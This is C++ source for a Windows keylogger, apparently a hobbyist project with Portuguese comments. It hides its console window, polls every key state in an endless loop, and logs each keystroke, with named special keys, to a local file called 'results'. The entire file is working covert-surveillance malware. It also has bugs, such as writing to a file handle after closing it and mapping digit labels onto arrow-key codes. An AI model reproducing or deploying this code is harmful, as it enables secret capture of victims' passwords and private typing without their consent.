/*
Keylogger.cpp
Autor: ksx1777
Data: 13/11/2020
*/

#include "keylogger.h"
#define KEYLIST_S 31

using namespace std;

/* LISTA DE TECLAS NAO RECONHECIDAS QUANDO
O CODIGO ASCII E CONVERTIDO PARA UM CHAR */
KEYLIST unrecogKeys[] = {
    {"[TAB]", 9},
    {"[CAPS]", 20},
    {"[SHIFT]", 160},
    {"[PONTO]", 190},
    {"[PONTO_2]", 194},

    {"[VIRGULA]", 188},
    {"[ASPAS]", 192},
    {"[ENTER]", 13},
    {"[NUMLOCK]", 144},
    {"[BACKSPACE]", 8},

    {"[DIR.]", 39},
    {"[ESQ.]", 37},
    {"[CIMA]", 38},
    {"[BAIXO]", 40},
    {"[ / ]", 111},

    {"[CTRL1]", 162},
    {"[CTRL2]", 163},
    {"[DEL]", 46},
    {"[ - ]", 189},
    {"[ * ]", 106},

    {"[SPACE]", 32},

    {"[0]", 48},
    {"[1]", 35},
    {"[2]", 40},
    {"[3]", 34},
    {"[4]", 37},
    {"[5]", 12},
    {"[6]", 39},
    {"[7]", 36},
    {"[8]", 38},
    {"[9]", 33}
};

int getPressedKey(int ascV1, int ascV2){
    int pressedKey = 0;
    for(int character = ascV1; character <= ascV2; character++) {
        if(GetAsyncKeyState(character) == -32767) {
            pressedKey = character;
        }
    }
    return pressedKey;
}

void wKeys(int ascCode){
    FILE *f = fopen("results", "a+");

    //VERIFICAR SE AS TECLAS SAO ESPECIAIS
    for(int i = 0; i < KEYLIST_S; i++){
        if(ascCode == unrecogKeys[i].asciiKey){
            fputc('\n', f);
            fwrite(unrecogKeys[i].keyName, 1, strlen(unrecogKeys[i].keyName), f);
            fputc('\n', f);
            fclose(f);
            break;
        }
    }
    fputc('\n', f);
    fputc('[', f);
    fputc(char(ascCode), f);
    fputc(']', f);
    fputc('\n', f);
    fclose(f);
}

void clearLogs(void){
    FILE *log = fopen("results", "w");
    fputc(0, log);
    fclose(log);
}

int main(void){
    FreeConsole();
    clearLogs();
    int key = 0;
    for(;;){
        Sleep(INTERVAL);
        key = getPressedKey(8, 255);
        if(key != 0){
            wKeys(key);
        }
    }
    return 0;
}
